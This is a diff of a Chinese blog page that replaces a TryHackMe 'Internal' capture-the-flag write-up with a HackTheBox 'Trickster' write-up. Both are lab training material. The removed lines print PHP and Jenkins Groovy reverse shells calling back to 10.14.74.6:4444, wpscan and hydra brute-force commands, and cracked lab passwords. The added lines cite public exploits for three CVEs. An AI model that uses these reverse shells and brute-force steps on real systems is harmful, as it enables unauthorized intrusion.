@@ -16,35 +16,49 @@
   <meta name="author" content="FSRM">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Internal信息收集：nmap扫一波  22和80端口开放 扫下后台  有一个phpadmin和wordpress的后台登录 使用wpscn扫一下看看情况 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -eu   利用wpscan爆破密码 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -U">
+    <meta name="description" content="HTB-Tricksterlinux 中等难度 信息收集端口扫描发现22和80端口开放 访问80端口 发现并不能访问它的服务 做一下映射 将域名添加到&#x2F;etc&#x2F;hosts中。    第一个网站扫后台扫到了一个assets 没找到什么有用的信息  第二个网站是一个PrestaSHop 网上搜了大部分是sql注入漏洞  注册一个账户登录进去看看。 没啥东西，扫后台可以知道是一个git泄露 利用GitH">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Internal">
-<meta property="og:url" content="http://example.com/2024/11/28/Internal/index.html">
+<meta property="og:title" content="HTB-Trickster">
+<meta property="og:url" content="http://example.com/2025/01/25/HTB-Trickster/index.html">
 <meta property="og:site_name" content="FSRM">
-<meta property="og:description" content="Internal信息收集：nmap扫一波  22和80端口开放 扫下后台  有一个phpadmin和wordpress的后台登录 使用wpscn扫一下看看情况 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -eu   利用wpscan爆破密码 1wpscan --url &quot;http:&#x2F;&#x2F;10.10.50.8&#x2F;blog&quot; -U">
+<meta property="og:description" content="HTB-Tricksterlinux 中等难度 信息收集端口扫描发现22和80端口开放 访问80端口 发现并不能访问它的服务 做一下映射 将域名添加到&#x2F;etc&#x2F;hosts中。    第一个网站扫后台扫到了一个assets 没找到什么有用的信息  第二个网站是一个PrestaSHop 网上搜了大部分是sql注入漏洞  注册一个账户登录进去看看。 没啥东西，扫后台可以知道是一个git泄露 利用GitH">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282302680.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282359335.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411290015774.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292205437.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292206145.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292221516.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292248911.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292309984.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292322884.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300053613.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300123382.png">
-<meta property="article:published_time" content="2024-11-28T14:45:09.823Z">
-<meta property="article:modified_time" content="2024-12-01T08:00:00.293Z">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251957752.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251958754.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501252013038.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501252215517.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261709363.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261716637.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261745026.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261748753.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262003844.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262009430.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262010474.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262032911.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262125007.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262127594.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262153288.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262255684.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262254895.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262321263.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262327909.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262330041.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262331375.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262337903.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270007792.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270007005.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270014867.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270014538.png">
+<meta property="article:published_time" content="2025-01-25T08:25:53.897Z">
+<meta property="article:modified_time" content="2025-01-26T16:23:52.712Z">
 <meta property="article:author" content="FSRM">
-<meta property="article:tag" content="tryhackme">
+<meta property="article:tag" content="HTB">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251957752.png">
   
   
   
-  <title>Internal - FSRM</title>
+  <title>HTB-Trickster - FSRM</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -251,7 +265,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Internal"></span>
+            <span id="subtitle" data-typed-text="HTB-Trickster"></span>
           
         </div>
 
@@ -262,8 +276,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-11-28 22:45" pubdate>
-          2024年11月28日 晚上
+        <time datetime="2025-01-25 16:25" pubdate>
+          2025年1月25日 下午
         </time>
       </span>
     
@@ -274,7 +288,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          1.5k 字
         
       </span>
     
@@ -285,7 +299,7 @@
         
         
         
-          14 分钟
+          13 分钟
         
       </span>
     
@@ -330,66 +344,77 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Internal</h1>
+            <h1 id="seo-header">HTB-Trickster</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h1><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>nmap扫一波</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png" srcset="/img/loading.gif" lazyload alt="image-20241128232225305"></p>
-<p>22和80端口开放</p>
-<p>扫下后台</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282302680.png" srcset="/img/loading.gif" lazyload alt="image-20241128230205435"></p>
-<p>有一个phpadmin和wordpress的后台登录</p>
-<p>使用wpscn扫一下看看情况</p>
-<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wpscan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -<span class="hljs-string">eu</span><br></code></pre></td></tr></table></figure>
+                <h1 id="HTB-Trickster"><a href="#HTB-Trickster" class="headerlink" title="HTB-Trickster"></a>HTB-Trickster</h1><p>linux 中等难度</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描发现22和80端口开放</p>
+<p>访问80端口 发现并不能访问它的服务 做一下映射 将域名添加到/etc/hosts中。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251957752.png" srcset="/img/loading.gif" lazyload alt="image-20250125195700473"></p>
+<p> <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501251958754.png" srcset="/img/loading.gif" lazyload alt="image-20250125195823382"></p>
+<p>第一个网站扫后台扫到了一个assets 没找到什么有用的信息</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501252013038.png" srcset="/img/loading.gif" lazyload alt="image-20250125201314949"></p>
+<p>第二个网站是一个PrestaSHop 网上搜了大部分是sql注入漏洞  注册一个账户登录进去看看。</p>
+<p>没啥东西，扫后台可以知道是一个git泄露 利用GitHack去扫一下 然后能得到一个路径，访问得知是一个后台的路径。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501252215517.png" srcset="/img/loading.gif" lazyload alt="image-20250125221548383"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="CVE-2024-34716"><a href="#CVE-2024-34716" class="headerlink" title="CVE-2024-34716"></a>CVE-2024-34716</h3><p>得知到版本信息 是8.1.5 搜到一个CVE-2024-34716</p>
+<p>参考地址：<a target="_blank" rel="noopener" href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/">https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/</a></p>
+<p>然后利用里面的脚本反弹shell即可，如果ncat没有的话 就换成nc</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261709363.png" srcset="/img/loading.gif" lazyload alt="image-20250126170921095"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用python搞一个交互shell</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282359335.png" srcset="/img/loading.gif" lazyload alt="image-20241128235936207"></p>
-<p>利用wpscan爆破密码</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -U admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure>
+<p>首先到home目录下查看有几个用户，一般从这些用户下手。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261716637.png" srcset="/img/loading.gif" lazyload alt="image-20250126171623507"></p>
+<p>下面往数据库这方面着手，去看一下config</p>
+<p>找到下面这个信息 去看一下。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261745026.png" srcset="/img/loading.gif" lazyload alt="image-20250126174538946"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501261748753.png" srcset="/img/loading.gif" lazyload alt="image-20250126174810630"></p>
+<p>mysql 连接上去看看。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262003844.png" srcset="/img/loading.gif" lazyload alt="image-20250126200342570"></p>
+<p>这个地方存在james用户密码的hash值。 </p>
+<p>是一个利用bcrypt生成的哈希值 然后用john爆破一下。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262009430.png" srcset="/img/loading.gif" lazyload alt="image-20250126200928247"></p>
+<p>ssh登录上去 转成james用户。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262010474.png" srcset="/img/loading.gif" lazyload alt="image-20250126201041338"></p>
+<h3 id="内网利用"><a href="#内网利用" class="headerlink" title="内网利用"></a>内网利用</h3><p>ifconfig发现有一个内网ip 但是服务的端口不知道 上传一个fscan</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262032911.png" srcset="/img/loading.gif" lazyload alt="image-20250126203215707"></p>
+<p>将已经编译好的fscan二进制文件传递过去 然后加一个可执行的权限。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262125007.png" srcset="/img/loading.gif" lazyload alt="image-20250126212509752"></p>
+<p>有一个内网的服务 ssh映射出来。</p>
+<h3 id="CVE-2024-32651"><a href="#CVE-2024-32651" class="headerlink" title="CVE-2024-32651"></a>CVE-2024-32651</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">5000</span>:<span class="hljs-number">172.17.0.2:5000</span> james@<span class="hljs-number">10.10.11.34</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411290015774.png" srcset="/img/loading.gif" lazyload alt="image-20241129001527658"></p>
-<p>得到密码 my2boys</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292205437.png" srcset="/img/loading.gif" lazyload alt="image-20241129220505885"></p>
-<p>这个地方可以添加php代码 然后具体路径的话 可以去网上找到</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nternal.thm<span class="hljs-regexp">/blog/</span>wp-content<span class="hljs-regexp">/themes/</span>twentyseventeen<span class="hljs-regexp">/404.php/</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262127594.png" srcset="/img/loading.gif" lazyload alt="image-20250126212735394"></p>
+<p>是一个changedetection.io 版本信息也有。登录的密码是james的ssh密码</p>
+<p>是一个CVE-2024-32651 poc利用链接：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52027">https://www.exploit-db.com/exploits/52027</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/">https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/</a></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262153288.png" srcset="/img/loading.gif" lazyload alt="image-20250126215351927"></p>
+<p>是root权限但是没啥东西。进去到datastore中看看。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262255684.png" srcset="/img/loading.gif" lazyload alt="image-20250126225554582"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262254895.png" srcset="/img/loading.gif" lazyload alt="image-20250126225418494"></p>
+<p>再backups目录下发现两个zip文件，将两个zip文件拉下来。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262321263.png" srcset="/img/loading.gif" lazyload alt="image-20250126232127886"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262327909.png" srcset="/img/loading.gif" lazyload alt="image-20250126232733725"></p>
+<p>是一个br文件 接着解压。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">brotli -d f<span class="hljs-number">04</span>f<span class="hljs-number">0732</span>f<span class="hljs-number">120</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">cc</span><span class="hljs-number">84</span>a<span class="hljs-number">993</span>ad<span class="hljs-number">99</span>decb<span class="hljs-number">2</span><span class="hljs-keyword">c</span>.txt.<span class="hljs-keyword">br</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292206145.png" srcset="/img/loading.gif" lazyload alt="image-20241129220611076"></p>
-<p>添加一个反弹shell的命令</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc -e /bin/bash 主机IP 主机端口&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;10.14.74.6&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-string">&quot;4444&quot;</span>;<br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>);<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>第二个可以连上 然后搞一个python的 交互shell</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
-
-<p>发现现在只是ww-data用户 看一下数据库是否有其他用户的信息</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292221516.png" srcset="/img/loading.gif" lazyload alt="image-20241129222147415"></p>
-<p>连接上去看看情况</p>
-<p>里面就有一个admin用户 并没有 我们想要的aubreanna用户的密码 查看/etc/shadow的内容提示没权限</p>
-<p>这里看了一下wp是在opt目录下发现的信息(以后还得仔细地翻看每个目录下的关键信息)</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292248911.png" srcset="/img/loading.gif" lazyload alt="image-20241129224826818"></p>
-<p>得到密码之后ssh登录上去即可 bubb13guM!@#123</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在 jenkins.txt 中可以看到还有一层内网的服务 </p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292309984.png" srcset="/img/loading.gif" lazyload alt="image-20241129230924923"></p>
-<p>利用ssh将这个ip上的服务转移到本地的8081端口上</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8081</span>:<span class="hljs-number">172.17.0.2:8080</span> aubreanna@<span class="hljs-number">10.10.201.110</span><br></code></pre></td></tr></table></figure>
-
-<p>然后访问localhost:8081 即可</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292322884.png" srcset="/img/loading.gif" lazyload alt="image-20241129232248828"></p>
-<p>我这里利用hydra去爆破密码了</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -s <span class="hljs-number">8081</span> -V -f -t <span class="hljs-number">50</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> http-form-post <span class="hljs-string">&quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span> -l admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure>
-
-<p>能得到密码 spongebob</p>
-<p>登录后台之后 再script下可以进行命令执行</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300053613.png" srcset="/img/loading.gif" lazyload alt="image-20241130005302498"></p>
-<p>进行一个反弹shell</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.14.74.6/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure>
-
-<p>得到shell之后 再次再opt目录下找到root的密码 tr0ub13guM!@#123</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300123382.png" srcset="/img/loading.gif" lazyload alt="image-20241130012326308"></p>
-<p>远程登录即可</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262330041.png" srcset="/img/loading.gif" lazyload alt="image-20250126232959921"></p>
+<p>里面存放着adam的用户密码。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262331375.png" srcset="/img/loading.gif" lazyload alt="image-20250126233122306"></p>
+<p>ssh登录一下。</p>
+<h3 id="CVE-2023-47268"><a href="#CVE-2023-47268" class="headerlink" title="CVE-2023-47268"></a>CVE-2023-47268</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262337903.png" srcset="/img/loading.gif" lazyload alt="image-20250126233716784"></p>
+<p>搜索prusaslicer相关提权信息 找到一个CVE CVE-2023-47268</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51983">https://www.exploit-db.com/exploits/51983</a> </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/suce0155/prusaslicer_exploit">https://github.com/suce0155/prusaslicer_exploit</a></p>
+<p>参考github上的 注意修改sh文件</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270007792.png" srcset="/img/loading.gif" lazyload alt="image-20250127000700566"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270007005.png" srcset="/img/loading.gif" lazyload alt="image-20250127000714908"></p>
+<p>3mf文件本身可以被解压缩 修改的是 Slic3r_PE.config文件</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270014867.png" srcset="/img/loading.gif" lazyload alt="image-20250127001416764"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270014538.png" srcset="/img/loading.gif" lazyload alt="image-20250127001400320"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先通过git泄露找到后台地址，然后通过版本信息找到CVE打，得到普通权限后，查看用户信息，收集数据库的信息，登录进去，利用john进行爆破，ssh登录新用户，查看内网服务，然后搜集漏洞并且合理利用，再进一步的信息收集，找到另外用户的密码，再次ssh登录进去，然后就是一个prusaslicer提权的利用 还是打CVE。</p>
 
                 
               </div>
@@ -408,7 +433,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Offensive-Pentesting/" class="category-chain-item">Offensive Pentesting</a>
+  <a href="/categories/Linux%E9%9D%B6%E6%9C%BA%E4%B8%AD%E7%BA%A7/" class="category-chain-item">Linux靶机中级</a>
   
   
 
@@ -423,7 +448,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/tryhackme/" class="print-no-link">#tryhackme</a>
+        <a href="/tags/HTB/" class="print-no-link">#HTB</a>
       
     </div>
   
@@ -435,8 +460,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Internal</div>
-      <div>http://example.com/2024/11/28/Internal/</div>
+      <div>HTB-Trickster</div>
+      <div>http://example.com/2025/01/25/HTB-Trickster/</div>
     </div>
     <div class="license-meta">
       
@@ -448,13 +473,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年11月28日</div>
+          <div>2025年1月25日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年12月1日</div>
+          <div>2025年1月27日</div>
         </div>
       
       
@@ -485,18 +510,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="域渗透基础知识">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">域渗透基础知识</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/11/08/Daily%20Bugle/" title="Daily Bugle">
-                        <span class="hidden-mobile">Daily Bugle</span>
+                      <a href="/2025/01/17/HTB-Cicada/" title="HTB-Cicada">
+                        <span class="hidden-mobile">HTB-Cicada</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
